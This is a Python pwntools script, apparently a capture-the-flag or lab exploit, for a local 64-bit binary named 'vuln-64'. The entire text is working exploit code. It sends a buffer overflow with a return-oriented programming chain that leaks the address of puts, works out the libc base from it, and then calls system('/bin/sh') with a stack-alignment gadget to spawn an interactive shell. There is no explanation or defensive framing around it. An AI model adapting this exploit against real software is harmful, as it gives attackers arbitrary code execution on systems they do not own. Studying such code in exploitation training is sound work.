from pwn import *

elf = context.binary = ELF('./vuln-64')
libc = elf.libc
p = process()

# Hardcoded pop rdi; ret
POP_RDI = 0x4011cb

# Find a ret gadget for stack alignment
rop = ROP(elf)
RET = rop.find_gadget(['ret'])[0]

# Stage 1: Leak puts
p.recvline()
payload = flat(
    b'A' * 40,
    POP_RDI,
    elf.got['puts'],
    elf.plt['puts'],
    elf.sym['main']
)
p.sendline(payload)

# Receive and process puts leak
puts_leak = u64(p.recvuntil(b'\n').strip().ljust(8, b'\x00'))
log.success(f'Leaked puts address: {hex(puts_leak)}')

# Calculate libc base
libc.address = puts_leak - libc.sym['puts']
log.success(f'Libc base: {hex(libc.address)}')

# Get address of /bin/sh
bin_sh = next(libc.search(b'/bin/sh\x00'), None)
if not bin_sh:
    log.error("Couldn't find /bin/sh in libc!")
    exit(1)

# Stage 2: Call system("/bin/sh") with stack alignment fix
payload = flat(
    b'A' * 40,
    POP_RDI,
    bin_sh,
    RET,                # <---- stack alignment fix
    libc.sym['system'],
    libc.sym['exit']
)

p.sendline(payload)
p.interactive()
